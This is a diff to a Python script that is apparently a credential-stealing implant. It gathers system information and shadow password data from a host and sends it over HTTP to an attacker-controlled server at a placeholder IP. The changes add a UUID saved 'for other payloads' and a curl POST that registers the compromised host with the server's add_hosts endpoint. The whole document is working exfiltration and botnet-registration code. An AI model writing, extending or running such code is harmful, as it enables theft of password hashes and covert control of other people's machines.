@@ -9,7 +9,7 @@ pwd = os.getcwd()
 
 # target address
 target_ip = "<REPLACE_IP>"
-target_ip = "127.0.0.1"
+# target_ip = "127.0.0.1"
 target_port = 10000
 target_passwd_path = "passwords"
 
@@ -26,6 +26,10 @@ def generate_uuid():
     return unique_id
 
 uuid = generate_uuid()
+
+# save uuid for other payloads
+with open(f"{pwd}/uuid.txt", "w") as f:
+    f.write(uuid)
 
 def send_data(raw_data, unique_id, path=target_passwd_path, kind="none"):
     url = f"http://{target_ip}:{target_port}/{path}"
@@ -97,7 +101,14 @@ def get_shadow():
 
 def exfiltrate(data, uuid, path):
     send_data(data, uuid, target_passwd_path, "shadow")
-    
+
+
+def add_host_to_server(uuid):
+    url = f"http://{target_ip}:{target_port}/add_hosts"
+    data = {"uuid": uuid}
+    result = Popen(["curl", "-X", "POST", "-H", "Content-Type: application/json", "-d", json.dumps(data), url], stdout=PIPE, stderr=STDOUT)
+    result.wait()
+
     
 def gather() -> str:
     modules = {
@@ -117,12 +128,13 @@ def gather() -> str:
         output += f"Output:\n{(module_output)}\n"
         output += "\n"
         send_data(output, uuid, target_passwd_path, module_name)    
-
+    
     
             
 
 
 if __name__ == "__main__":
     gather()
+    add_host_to_server(uuid)
 
 
